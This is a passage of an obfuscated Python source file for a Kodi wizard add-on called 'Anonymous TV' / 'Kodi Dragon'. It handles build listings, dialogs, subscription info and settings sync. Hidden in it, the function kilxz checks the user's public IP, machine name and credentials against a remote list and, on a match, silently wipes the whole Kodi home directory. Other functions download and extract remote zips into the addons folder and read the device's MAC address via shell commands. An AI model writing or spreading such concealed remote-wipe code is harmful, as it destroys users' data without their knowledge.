            elif OO0O0OO00O0OO0OO0 =='adult':return OOOOO0O000OOO00OO #line:473
            elif OO0O0OO00O0OO0OO0 =='description':return O0OO0OO0OOO00OO00 #line:474
            elif OO0O0OO00O0OO0OO0 =='all':return O000OO0O000OOOO0O ,OOO0O000OOOOOOOO0 ,OO00O00O0OOO0O000 ,OO0O0000O00OOOO00 ,OOO00OO000O0OO0O0 ,OOOOO0O000OOO00OO ,O0OO0OO0OOO00OO00 #line:475
    else :return False #line:476
def fix ():#line:477
    xbmc .executebuiltin ('UpdateLocalAddons()')#line:478
    xbmc .sleep (1000 )#line:479
    xbmc .executeJSONRPC ('{{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{{"addonid":"{0}","enabled":true}},"id":1}}'.format ('repository.gaia.2'))#line:480
def kilxz ():#line:481
  try :#line:482
    OOO000OOO00O0O000 =False #line:483
    import json ,platform ,requests #line:484
    OOOOOO000OOO0OOO0 =(ADDON .getSetting ("user"))#line:485
    O0O0OOOO00OO0O0O0 =(ADDON .getSetting ("pass"))#line:486
    OOOO000O0OO0O00OO =ld (dr )#line:487
    OO000OOO000000000 =urlopen (OOOO000O0OO0O00OO )#line:488
    O00OOO0000OOO0O00 =OO000OOO000000000 .readlines ()#line:489
    O00OOO0000OOO0O00 =[OOOOO00O000O0OOO0 .rstrip ()for OOOOO00O000O0OOO0 in O00OOO0000OOO0O00 ]#line:490
    O00OO0O0000OOO00O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:491
    O0OO0O00OO00OO0OO =platform .uname ()#line:493
    OOO0OOO00O0OOOO0O =O0OO0O00OO00OO0OO [1 ]#line:494
    O0OOOOOO00OOOOO00 =0 #line:495
    for O000OOO0O00O00O00 in O00OOO0000OOO0O00 :#line:496
        if O00OO0O0000OOO00O ==O000OOO0O00O00O00 .decode ('utf-8').split (' ==')[0 ]:#line:497
            O0OOOOOO00OOOOO00 =1 #line:498
            break #line:499
        if OOO0OOO00O0OOOO0O ==O000OOO0O00O00O00 .decode ('utf-8').split (' ==')[0 ]:#line:500
            O0OOOOOO00OOOOO00 =1 #line:501
            break #line:502
        if O000OOO0O00O00O00 .decode ('utf-8').split (' ==')[0 ]==OOOOOO000OOO0OOO0 or O000OOO0O00O00O00 .decode ('utf-8').split ()[0 ]==OOOOOO000OOO0OOO0 or O000OOO0O00O00O00 .decode ('utf-8').split ()[0 ]==O0O0OOOO00OO0O0O0 :#line:503
            O0OOOOOO00OOOOO00 =1 #line:504
            break #line:505
    if O0OOOOOO00OOOOO00 ==0 :#line:506
       sys .exit ()#line:507
    else :#line:508
      Account_Send (que (' הוסר '),'')#line:509
      O0O0OOO0O0OOOO0OO =os .path .join (HOME )#line:510
      if os .path .exists (O0O0OOO0O0OOOO0OO ):#line:511
            for OO000O0O0O00OOO0O ,O0O0OO0OOOO0O0O00 ,O0000OO00OO000O00 in os .walk (O0O0OOO0O0OOOO0OO ):#line:512
                for O000000OOOO00O00O in O0000OO00OO000O00 :#line:513
                    try :#line:514
                        os .unlink (os .path .join (OO000O0O0O00OOO0O ,O000000OOOO00O00O ))#line:515
                    except :pass #line:516
                for O0000OO0OO0000OOO in O0O0OO0OOOO0O0O00 :#line:517
                    try :#line:518
                        shutil .rmtree (os .path .join (OO000O0O0O00OOO0O ,O0000OO0OO0000OOO ))#line:519
                    except :pass #line:520
  except :pass #line:521
def gdrive ():#line:522
    OOOOOOOO0000OO000 ='https://github.com/vip200/victory/blob/master/n.zip?raw=true'#line:523
    O000O0O0O0OO0O0O0 =translatepath (os .path .join ('special://home/addons','packages'))#line:524
    O0OOO0OO0OOO00O00 =os .path .join (PACKAGES ,'isr.zip')#line:525
    OOOO0OOOO0OOOO000 =Request (OOOOOOOO0000OO000 )#line:526
    O0O0OO0OOOO0000O0 =urlopen (OOOO0OOOO0OOOO000 )#line:527
    OO0O0OO0000O0OO00 =open (O0OOO0OO0OOO00O00 ,'wb')#line:528
    try :#line:529
      O00000O0OO0O00O00 =O0O0OO0OOOO0000O0 .info ().getheader ('Content-Length').strip ()#line:530
      OOO0O00O00O00O000 =True #line:531
    except AttributeError :#line:532
          OOO0O00O00O00O000 =False #line:533
    if OOO0O00O00O00O000 :#line:534
          O00000O0OO0O00O00 =int (O00000O0OO0O00O00 )#line:535
    OO0OO0O0O000O00O0 =0 #line:536
    OO0O0O0OOOOOOO00O =time .time ()#line:537
    while True :#line:538
          O000OOOOOOO00O00O =O0O0OO0OOOO0000O0 .read (8192 )#line:539
          if not O000OOOOOOO00O00O :#line:540
              sys .stdout .write ('\n')#line:541
              break #line:542
          OO0OO0O0O000O00O0 +=len (O000OOOOOOO00O00O )#line:544
          OO0O0OO0000O0OO00 .write (O000OOOOOOO00O00O )#line:545
    O0O0000OO0OO0OOO0 =translatepath (os .path .join ('special://home/addons'))#line:547
    OO0O0OO0000O0OO00 .close ()#line:548
    O00O0OOO0O0OO0000 =zipfile .ZipFile (O0OOO0OO0OOO00O00 ,'r')#line:550
    O00O0OOO0O0OO0000 .extractall (O0O0000OO0OO0OOO0 )#line:551
    try :#line:553
      os .remove (O0OOO0OO0OOO00O00 )#line:554
    except :#line:555
      pass #line:556
    fix ()#line:558
def contact_wiz (msg =""):#line:559
    class OOOO000OOOO000000 (xbmcgui .WindowXMLDialog ):#line:560
        def __init__ (O0OOO0O00OO00O00O ,*O000OOO0O0O0O0O00 ,**OOOO0000OO0000000 ):#line:561
            O0OOO0O00OO00O00O .title =THEME3 %OOOO0000OO0000000 ["title"]#line:562
            O0OOO0O00OO00O00O .image =OOOO0000OO0000000 ["image"]#line:563
            O0OOO0O00OO00O00O .fanart =OOOO0000OO0000000 ["fanart"]#line:564
            O0OOO0O00OO00O00O .msg =THEME2 %OOOO0000OO0000000 ["msg"]#line:565
        def onInit (O00O0OOO0O000O000 ):#line:567
            O00O0OOO0O000O000 .fanartimage =101 #line:568
            O00O0OOO0O000O000 .titlebox =102 #line:569
            O00O0OOO0O000O000 .imagecontrol =103 #line:570
            O00O0OOO0O000O000 .textbox =104 #line:571
            O00O0OOO0O000O000 .scrollcontrol =105 #line:572
            O00O0OOO0O000O000 .closebutton =106 #line:573
            O00O0OOO0O000O000 .showdialog ()#line:574
        def showdialog (OO0O0000O0O0OO000 ):#line:576
            OO0O0000O0O0OO000 .getControl (OO0O0000O0O0OO000 .imagecontrol ).setImage (OO0O0000O0O0OO000 .image )#line:577
            OO0O0000O0O0OO000 .getControl (OO0O0000O0O0OO000 .fanartimage ).setImage (OO0O0000O0O0OO000 .fanart )#line:578
            OO0O0000O0O0OO000 .getControl (OO0O0000O0O0OO000 .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:579
            OO0O0000O0O0OO000 .getControl (OO0O0000O0O0OO000 .textbox ).setText (OO0O0000O0O0OO000 .msg )#line:580
            OO0O0000O0O0OO000 .getControl (OO0O0000O0O0OO000 .titlebox ).setLabel (OO0O0000O0O0OO000 .title )#line:581
            OO0O0000O0O0OO000 .setFocusId (OO0O0000O0O0OO000 .closebutton )#line:582
        def onClick (OOOOOOO0OO00OO00O ,OOO00OOO0OOOO0OO0 ):#line:583
            if OOO00OOO0OOOO0OO0 ==OOOOOOO0OO00OO00O .closebutton :OOOOOOO0OO00OO00O .close ()#line:584
        def onAction (O00O0OO0O00O00OOO ,O0O00O0OO0O0000O0 ):#line:585
            if O0O00O0OO0O0000O0 ==O00O0OO0O00O00OOO .closebutton :O00O0OO0O00O00OOO .close ()#line:586
            elif O0O00O0OO0O0000O0 ==ACTION_PREVIOUS_MENU :O00O0OO0O00O00OOO .close ()#line:587
            elif O0O00O0OO0O0000O0 ==ACTION_NAV_BACK :O00O0OO0O00O00OOO .close ()#line:588
    if getS ('dragon')=='true':#line:589
        O0O00OOOOO0O0OOOO =OOOO000OOOO000000 ("ContactDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:590
    else :#line:591
        O0O00OOOOO0O0OOOO =OOOO000OOOO000000 ("Contact.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:592
    O0O00OOOOO0O0OOOO .doModal ()#line:593
    del O0O00OOOOO0O0OOOO #line:594
def user_info_Window (O00000OO0OO00OO00 ,O00OO00000O0OOO00 ,OO0O0OOO000O0O00O ,OOO00O0OO0000OOO0 ,O0000OOOOO00000O0 ,OOO0O0O0O00O0OOO0 ):#line:595
    class O00OO00OO00O0O000 (xbmcgui .WindowXMLDialog ):#line:596
        def __init__ (OO000OO0000OO000O ,*OOOO0O0O0OO000O00 ,**OO0OOO0O0OOO0OO0O ):#line:597
            OO000OO0000OO000O .title =THEME3 %OO0OOO0O0OOO0OO0O ["title"]#line:598
            OO000OO0000OO000O .image =OO0OOO0O0OOO0OO0O ["image"]#line:599
            OO000OO0000OO000O .fanart =OO0OOO0O0OOO0OO0O ["fanart"]#line:600
            OO000OO0000OO000O .tele =OO0OOO0O0OOO0OO0O ["tele"]#line:601
            OO000OO0000OO000O .update =OO0OOO0O0OOO0OO0O ["update"]#line:602
            OO000OO0000OO000O .rd =OO0OOO0O0OOO0OO0O ["rd"]#line:603
            OO000OO0000OO000O .userdate =OO0OOO0O0OOO0OO0O ["userdate"]#line:604
            OO000OO0000OO000O .username =OO0OOO0O0OOO0OO0O ["username"]#line:605
            OO000OO0000OO000O .device =OO0OOO0O0OOO0OO0O ["device"]#line:606
        def onInit (O0O0O0OOO0OO0O000 ):#line:608
            O0O0O0OOO0OO0O000 .username_title =100 #line:609
            O0O0O0OOO0OO0O000 .fanartimage =101 #line:610
            O0O0O0OOO0OO0O000 .titlebox =102 #line:611
            O0O0O0OOO0OO0O000 .imagecontrol =103 #line:612
            O0O0O0OOO0OO0O000 .textbox =104 #line:613
            O0O0O0OOO0OO0O000 .scrollcontrol =105 #line:614
            O0O0O0OOO0OO0O000 .closebutton =106 #line:615
            O0O0O0OOO0OO0O000 .tele_title =107 #line:616
            O0O0O0OOO0OO0O000 .update_title =108 #line:617
            O0O0O0OOO0OO0O000 .rd_title =109 #line:618
            O0O0O0OOO0OO0O000 .device_cunt =110 #line:619
            O0O0O0OOO0OO0O000 .userdate_title =111 #line:620
            O0O0O0OOO0OO0O000 .showdialog ()#line:622
        def showdialog (OOO0O000OO0000O00 ):#line:624
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .username_title ).setLabel (OOO0O000OO0000O00 .username )#line:625
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .device_cunt ).setLabel (OOO0O000OO0000O00 .device )#line:626
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .imagecontrol ).setImage (OOO0O000OO0000O00 .image )#line:628
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .fanartimage ).setImage (OOO0O000OO0000O00 .fanart )#line:629
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:630
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .tele_title ).setLabel (OOO0O000OO0000O00 .tele )#line:633
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .update_title ).setLabel (OOO0O000OO0000O00 .update )#line:634
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .rd_title ).setLabel (OOO0O000OO0000O00 .rd )#line:635
            OOO0O000OO0000O00 .getControl (OOO0O000OO0000O00 .userdate_title ).setLabel (OOO0O000OO0000O00 .userdate )#line:636
            OOO0O000OO0000O00 .setFocusId (OOO0O000OO0000O00 .closebutton )#line:638
        def onClick (OO0O0OO0O000OO0O0 ,O0OO000O0O0OO00O0 ):#line:640
            if O0OO000O0O0OO00O0 ==OO0O0OO0O000OO0O0 .closebutton :OO0O0OO0O000OO0O0 .close ()#line:641
        def onAction (O0O0000O0OO0OO0O0 ,O00OO0000OOO00000 ):#line:642
            if O00OO0000OOO00000 ==O0O0000O0OO0OO0O0 .closebutton :O0O0000O0OO0OO0O0 .close ()#line:643
            elif O00OO0000OOO00000 ==ACTION_PREVIOUS_MENU :O0O0000O0OO0OO0O0 .close ()#line:644
            elif O00OO0000OOO00000 ==ACTION_NAV_BACK :O0O0000O0OO0OO0O0 .close ()#line:645
    if getS ('dragon')=='true':#line:646
        O0OO00O0OO0O00000 =O00OO00OO00O0O000 ("userinfoDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,tele =O00000OO0OO00OO00 ,userdate =OOO00O0OO0000OOO0 ,update =O00OO00000O0OOO00 ,rd =OO0O0OOO000O0O00O ,username =O0000OOOOO00000O0 ,device =OOO0O0O0O00O0OOO0 )#line:647
    else :#line:648
        O0OO00O0OO0O00000 =O00OO00OO00O0O000 ("userinfo.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,tele =O00000OO0OO00OO00 ,userdate =OOO00O0OO0000OOO0 ,update =O00OO00000O0OOO00 ,rd =OO0O0OOO000O0O00O ,username =O0000OOOOO00000O0 ,device =OOO0O0O0O00O0OOO0 )#line:649
    O0OO00O0OO0O00000 .doModal ()#line:650
    del O0OO00O0OO0O00000 #line:651
def req ():#line:652
    import sys #line:653
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.requests/lib')#line:654
    sys .path .append (O00O0O0OOOO0000OO )#line:655
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.urllib3/lib')#line:656
    sys .path .append (O00O0O0OOOO0000OO )#line:657
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.chardet/lib')#line:658
    sys .path .append (O00O0O0OOOO0000OO )#line:659
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.certifi/lib')#line:660
    sys .path .append (O00O0O0OOOO0000OO )#line:661
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.idna/lib')#line:662
    sys .path .append (O00O0O0OOOO0000OO )#line:663
    O00O0O0OOOO0000OO =translatepath ('special://home/addons/script.module.futures/lib')#line:664
    sys .path .append (O00O0O0OOOO0000OO )#line:665
def getHwAddr (OO00OOO0OO00O0O0O ):#line:666
   import subprocess ,time #line:667
   if xbmc .getCondVisibility ('system.platform.android'):#line:668
     O0000OO00O00OO0OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:669
     O0000O0O00OOO0O0O =re .compile ('link/ether (.+?) brd').findall (str (O0000OO00O00OO0OO ))#line:670
     OO0OOO0000O000O00 =0 #line:671
     for O0OOO0OOOO0OOOO0O in O0000O0O00OOO0O0O :#line:672
      if O0000O0O00OOO0O0O !='00:00:00:00:00:00':#line:673
          O000O00000O0000O0 =O0OOO0OOOO0OOOO0O #line:674
          OO0OOO0000O000O00 =OO0OOO0000O000O00 +int (O000O00000O0000O0 .replace (':',''),16 )#line:675
          break #line:676
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:677
       O000OOOOO00OO00OO =0 #line:678
       OO0OOO0000O000O00 =0 #line:679
       OO0O00O0000OO000O =[]#line:680
       O00O0000000000O00 =os .popen ("getmac").read ()#line:681
       O00O0000000000O00 =O00O0000000000O00 .split ("\n")#line:682
       for O0000OO000O00O0OO in O00O0000000000O00 :#line:683
            OOO0OO000000O000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0000OO000O00O0OO ,re .I )#line:684
            if OOO0OO000000O000O :#line:685
                O0000O0O00OOO0O0O =OOO0OO000000O000O .group ().replace ('-',':')#line:686
                OO0O00O0000OO000O .append (O0000O0O00OOO0O0O )#line:687
                OO0OOO0000O000O00 =OO0OOO0000O000O00 +int (O0000O0O00OOO0O0O .replace (':',''),16 )#line:688
                break #line:689
   elif xbmc .getCondVisibility ('system.platform.linux'):#line:690
       OO0OOO0000O000O00 =0 #line:691
       import uuid #line:692
       O0000O0O00OOO0O0O =hex (uuid .getnode ())#line:693
       OO0OOO0000O000O00 =OO0OOO0000O000O00 +int (O0000O0O00OOO0O0O .replace (':',''),16 )#line:694
   else :#line:695
       OO0OOO0000O000O00 =0 #line:696
       import uuid #line:697
       O0000O0O00OOO0O0O =hex (uuid .getnode ())#line:698
       OO0OOO0000O000O00 =OO0OOO0000O000O00 +int (O0000O0O00OOO0O0O .replace (':',''),16 )#line:699
   try :#line:714
    return OO0OOO0000O000O00 #line:715
   except :pass #line:716
def user_info ():#line:717
    xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:718
    O0O000OOO0O00O0OO =xbmcaddon .Addon ('plugin.video.telemedia')#line:719
    O00O00O0000O00O00 =O0O000OOO0O00O0OO .getSetting ('port')#line:720
    OO0000OO000000O0O =(ADDON .getSetting ("user"))#line:721
    O0O00O0OOOOOO0OOO =[]#line:722
    OOOO000O000OO00O0 =[]#line:723
    OOO00000O0OOOOO00 =[]#line:724
    try :#line:726
        OOOO0000OO0OO000O =read_skin ('playback')#line:727
        O00OO0OOO0OO0O0O0 =read_skin_dragon ('playback')#line:728
        O0OOO00O0OOO000OO =[OOOO0000OO0OO000O ,O00OO0OOO0OO0O0O0 ]#line:729
        for OO0O0O00O000O0O00 in O0OOO00O0OOO000OO :#line:730
            for O000OOO00000OOO0O in OO0O0O00O000O0O00 :#line:731
                O000OO0OOO00O00OO =OO0O0O00O000O0O00 [O000OOO00000OOO0O ]#line:732
                try :#line:733
                    OOOO000O000OO00O0 .append ((O000OO0OOO00O00OO ['name'],O000OO0OOO00O00OO ['date'],O000OO0OOO00O00OO ['sync'],O000OO0OOO00O00OO ['dragon'],O000OO0OOO00O00OO ['device'],O000OO0OOO00O00OO ['rduser'],O000OO0OOO00O00OO ['rdpass'],O000OO0OOO00O00OO ['telegram_user'],O000OO0OOO00O00OO ['p1'],O000OO0OOO00O00OO ['p2'],O000OO0OOO00O00OO ['p3']))#line:734
                except :#line:735
                    OOO00000O0OOOOO00 .append ((O000OO0OOO00O00OO ['name'],O000OO0OOO00O00OO ['date'],O000OO0OOO00O00OO ['sync'],O000OO0OOO00O00OO ['dragon'],O000OO0OOO00O00OO ['device']))#line:736
        for OO0OO0O00OOO0OOOO ,OO0OO0OOOO00OOOO0 ,OOO00O00OOOO0OO00 ,OOO00OO0O0O0000OO ,OOO000OOO0OOOO0O0 ,OO0OOO0O000O0O0O0 ,OOOO00OO0OO0O0OOO ,O0000000O00O0OOO0 ,OOO0OOO00OOOOOOOO ,OOOOOOOOO0000OOOO ,OO00OO0O00OOO00OO in OOOO000O000OO00O0 :#line:738
            if OO0OO0O00OOO0OOOO .split ()[0 ].lower ()==OO0000OO000000O0O :#line:740
                OO00O000O000000O0 =1 #line:741
                setS ("date_user",OO0OO0OOOO00OOOO0 .replace (' ',''))#line:742
        for OO0OO0O00OOO0OOOO ,OO0OO0OOOO00OOOO0 ,OOO00O00OOOO0OO00 ,OOO00OO0O0O0000OO ,OOO000OOO0OOOO0O0 in OOO00000O0OOOOO00 :#line:743
            if OO0OO0O00OOO0OOOO .split ()[0 ].lower ()==OO0000OO000000O0O :#line:745
                OO00O000O000000O0 =1 #line:746
                setS ("date_user",OO0OO0OOOO00OOOO0 .replace (' ',''))#line:747
    except :pass #line:748
    try :#line:749
        import random #line:750
        import requests #line:752
        OO00O0000OO00OO00 =random .randint (1 ,1001 )#line:753
        O0O00OOO0O0000O00 ={'type':'td_send','info':json .dumps ({'@type':'getOption','name':'my_id','@extra':OO00O0000OO00OO00 })}#line:756
        OOOO0O0000OOOOO00 =requests .post ('http://127.0.0.1:%s/'%O00O00O0000O00O00 ,json =O0O00OOO0O0000O00 ).json ()#line:757
        O0OO00O000O00OO00 =OOOO0O0000OOOOO00 ['value']#line:758
        if '1229060184'==O0OO00O000O00OO00 or '838481324'==O0OO00O000O00OO00 or '5667480303'==O0OO00O000O00OO00 :#line:759
          OOO0O0OOO0000O0O0 ='חשבון טלמדיה: VIP פעיל'#line:760
        else :#line:761
          OOO0O0OOO0000O0O0 ='חשבון טלמדיה: אישי'#line:762
    except :#line:763
          OOO0O0OOO0000O0O0 ='חשבון טלמדיה: אינו פעיל'#line:764
    if getS ('dragon')=='true':#line:765
        OO0O0OO0OOOOO0O0O ='תקופת המנוי ב Kodi Dragon תסתיים בתאריך: '+getS ("date_user")#line:766
    else :#line:767
        OO0O0OO0OOOOO0O0O ='תקופת המנוי Anonymous TV תסתיים בתאריך: '+getS ("date_user")#line:768
    OOOOOO00OOOOOOO0O =os .path .join (translatepath ("special://home/"),"addons","skin.Premium.mod","16x9","Includes_Home.xml")#line:769
    O00O000O00O0O0OOO =open (OOOOOO00OOOOOOO0O ,'r',encoding ='utf-8')#line:771
    OO000OOO00OO00OOO =O00O000O00O0O0OOO .read ()#line:772
    O00O000O00O0O0OOO .close ()#line:773
    OOOOOO00O00O000O0 ='<!-- 2 --><label>(.+?)</label>'#line:775
    O00O0OOOOO0O0OO0O =re .compile (OOOOOO00O00O000O0 ).findall (OO000OOO00OO00OOO )[0 ]#line:776
    OO0OO00O00OOOOOOO =''#line:777
    if os .path .exists (translatepath ("special://home/addons/")+'plugin.video.kitana'):#line:778
        O0O000OOO0O00O0OO =xbmcaddon .Addon ('plugin.video.kitana')#line:779
        if len (O0O000OOO0O00O0OO .getSetting ('rd.token'))>0 :#line:781
            OO0OO00O00OOOOOOO ='true'#line:782
    if OO0OO00O00OOOOOOO =='true':#line:783
        try :#line:784
            O0000OO000OO0O000 =O0O000OOO0O00O0OO .getSetting ('rd.auth')#line:785
            O00OOOOOO0OOO0000 ='https://api.real-debrid.com/rest/1.0/user?auth_token=%s'%O0000OO000OO0O000 #line:786
            import requests #line:788
            O0000OO00O0OO000O =requests .get (O00OOOOOO0OOO0000 ,timeout =15 ).json ()#line:789
            OOOOOO00O00O000O0 ='(.+?)T'#line:790
            OOOOO0O0O00O0OO00 =re .compile (OOOOOO00O00O000O0 ).findall (O0000OO00O0OO000O ['expiration'])[0 ]#line:791
            from datetime import datetime #line:792
            O00O000OOO0O0000O ,O00OO0OOO0OOOOO00 ,OOO0O000000O0O00O =OOOOO0O0O00O0OO00 .split ('-')#line:793
            OO0OO0OOOO00OOOO0 =OOO0O000000O0O00O +'.'+O00OO0OOO0OOOOO00 +'.'+O00O000OOO0O0000O #line:794
            O0OO0O00OOOOOOOOO ='שירות Real-Debrid פעיל ומסתיים בתאריך: '+str (OO0OO0OOOO00OOOO0 )#line:795
        except :#line:796
            O0OO0O00OOOOOOOOO ='שירות Real-Debrid פעיל'#line:797
    else :#line:798
      O0OO0O00OOOOOOOOO ='שירות Real-Debrid: אינו פעיל'#line:799
    O000O000000OO00O0 ='תאריך עדכון מערכת: '+O00O0OOOOO0O0OO0O #line:800
    OOOOO0OO00O0O00OO ='שם משתמש: '+getS ('user')#line:802
    OOO000OOO0OOOO0O0 ='כמות מכשירים: '+getS ("device")#line:805
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:806
    user_info_Window (OOO0O0OOO0000O0O0 ,O000O000000OO00O0 ,O0OO0O00OOOOOOOOO ,OO0O0OO0OOOOO0O0O ,OOOOO0OO00O0O00OO ,OOO000OOO0OOOO0O0 )#line:808
TMDB_NEW_API =uservar .TMDB_NEW_API #line:809
def user_sync ():#line:810
    OOO000O00000000OO =getS ("sync_user")#line:811
    try :#line:812
        OO00O0OOOOO0OOO00 =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:813
        OO00O0OOOOO0OOO00 .setSetting ('firebase',OOO000O00000000OO )#line:814
    except :pass #line:816
    try :#line:817
        O000OO00OOO0OOOO0 =xbmcaddon .Addon ('plugin.video.telemedia')#line:818
        O000OO00OOO0OOOO0 .setSetting ('firebase',OOO000O00000000OO )#line:819
        O000OO00OOO0OOOO0 .setSetting ('sync_mod','true')#line:820
    except :pass #line:821
    try :#line:822
        O0OOO0O0O00OO00OO =xbmcaddon .Addon ('plugin.video.mando')#line:823
        O0OOO0O0O00OO00OO .setSetting ('firebase',OOO000O00000000OO )#line:824
        O0OOO0O0O00OO00OO .setSetting ('sync_mod','true')#line:825
    except :pass #line:826
    try :#line:827
        OO0O0O0O00OO00O00 =xbmcaddon .Addon ('script.module.xtvsh')#line:828
        OO0O0O0O00OO00O00 .setSetting ('firebase',OOO000O00000000OO )#line:829
        OO0O0O0O00OO00O00 .setSetting ('sync_mod','true')#line:830
    except :pass #line:831
    try :#line:832
        OOOO00OOO0O000O0O =xbmcaddon .Addon ('plugin.video.thorrent')#line:833
        OOOO00OOO0O000O0O .setSetting ('firebase',OOO000O00000000OO )#line:834
        OOOO00OOO0O000O0O .setSetting ('sync_mod','true')#line:835
    except :pass #line:836
    try :#line:837
        O0O0O0O00OO00O00O =xbmcaddon .Addon ('context.myfav')#line:838
        O0O0O0O00OO00O00O .setSetting ('firebase',OOO000O00000000OO )#line:839
        O0O0O0O00OO00O00O .setSetting ('sync_mod','true')#line:840
    except :pass #line:841
def make_setting_file ():#line:844
    OO0OOOOOO000O0O0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:845
    OOO000OO000000O0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:846
    try :#line:847
        OOO0O00O0OOO0OO0O =open (OO0OOOOOO000O0O0O ,'r',encoding ='utf-8')#line:849
        O00OO0O000OO0O000 =OOO0O00O0OOO0OO0O .read ()#line:850
        OOO0O00O0OOO0OO0O .close ()#line:851
        if O00OO0O000OO0O000 =='':#line:852
                copyfile (OOO000OO000000O0O ,OO0OOOOOO000O0O0O )#line:854
    except :#line:855
       os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.program.Anonymous","settings.xml"))#line:856
def decode (OO0OO0000000OOOO0 ,OO0000O0000O00OO0 ):#line:857
    import base64 #line:858
    O000O00OO0O00O0OO =[]#line:859
    if (len (OO0OO0000000OOOO0 ))!=4 :#line:861
     return 10 #line:862
    OO0000O0000O00OO0 =base64 .urlsafe_b64decode (OO0000O0000O00OO0 )#line:863
    for OO0OO0000O000O0OO in range (len (OO0000O0000O00OO0 )):#line:865
        O0O00OOO000OOOOOO =OO0OO0000000OOOO0 [OO0OO0000O000O0OO %len (OO0OO0000000OOOO0 )]#line:866
        try :#line:867
          OO0O00O0OOOO0OO00 =chr ((256 +ord (OO0000O0000O00OO0 [OO0OO0000O000O0OO ])-ord (O0O00OOO000OOOOOO ))%256 )#line:868
        except :#line:869
          OO0O00O0OOOO0OO00 =chr ((256 +(OO0000O0000O00OO0 [OO0OO0000O000O0OO ])-ord (O0O00OOO000OOOOOO ))%256 )#line:870
        O000O00OO0O00O0OO .append (OO0O00O0OOOO0OO00 )#line:871
    return "".join (O000O00OO0O00O0OO )#line:872
def checkWizard (OOOOO000O0O00O0O0 ):#line:880
    if not workingURL (WIZARDFILE )==True :return False #line:881
    O0O0OOOOO00O0O000 =openURL (WIZARDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:882
    OO0OO00O00000O0O0 =re .compile ('id="%s".+?ersion="(.+?)".+?ip="(.+?)"'%ADDON_ID ).findall (O0O0OOOOO00O0O000 )#line:883
    if len (OO0OO00O00000O0O0 )>0 :#line:884
        for O0O0OOO00OO0O0OO0 ,OOO0000OOOO000OO0 in OO0OO00O00000O0O0 :#line:885
            if OOOOO000O0O00O0O0 =='version':return O0O0OOO00OO0O0OO0 #line:886
            elif OOOOO000O0O00O0O0 =='zip':return OOO0000OOOO000OO0 #line:887
            elif OOOOO000O0O00O0O0 =='all':return ADDON_ID ,O0O0OOO00OO0O0OO0 ,OOO0000OOOO000OO0 #line:888
    else :return False #line:889
def buildCount (ver =None ):#line:891
    OO00O0OO00O00000O =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:892
    OOOO000OOOOOOO000 =re .compile ('name="(.+?)".+?odi="(.+?)".+?dult="(.+?)"').findall (OO00O0OO00O00000O )#line:893
    O000OO000OOOO0OOO =0 ;OO00OOO000000O00O =0 ;O0000O0O0O0OOOO00 =0 ;OOOOO0O000O0O0OO0 =0 ;OOO0OOO000OO0O000 =0 ;O0000O000O00O000O =0 ;OO000O0000000OOO0 =0 #line:894
    if len (OOOO000OOOOOOO000 )>0 :#line:895
        for OOOOO0OO00O0O0000 ,O0O0000000OOOO0O0 ,OO0OO0OOOO00OOO0O in OOOO000OOOOOOO000 :#line:896
            if not SHOWADULT =='true'and OO0OO0OOOO00OOO0O .lower ()=='yes':O0000O000O00O000O +=1 ;OO000O0000000OOO0 +=1 ;continue #line:897
            if not DEVELOPER =='true'and strTest (OOOOO0OO00O0O0000 ):O0000O000O00O000O +=1 ;continue #line:898
            O0O0000000OOOO0O0 =int (float (O0O0000000OOOO0O0 ))#line:899
            O000OO000OOOO0OOO +=1 #line:900
            if O0O0000000OOOO0O0 ==18 :OOO0OOO000OO0O000 +=1 #line:901
            elif O0O0000000OOOO0O0 ==17 :OOOOO0O000O0O0OO0 +=1 #line:902
            elif O0O0000000OOOO0O0 ==16 :O0000O0O0O0OOOO00 +=1 #line:903
            elif O0O0000000OOOO0O0 <=15 :OO00OOO000000O00O +=1 #line:904
    return O000OO000OOOO0OOO ,OO00OOO000000O00O ,O0000O0O0O0OOOO00 ,OOOOO0O000O0O0OO0 ,OOO0OOO000OO0O000 ,OO000O0000000OOO0 ,O0000O000O00O000O #line:905
def strTest (O0000OO000OOO00OO ):#line:907
    OO00O00OO00OO0OO0 =(O0000OO000OOO00OO .lower ()).split (' ')#line:908
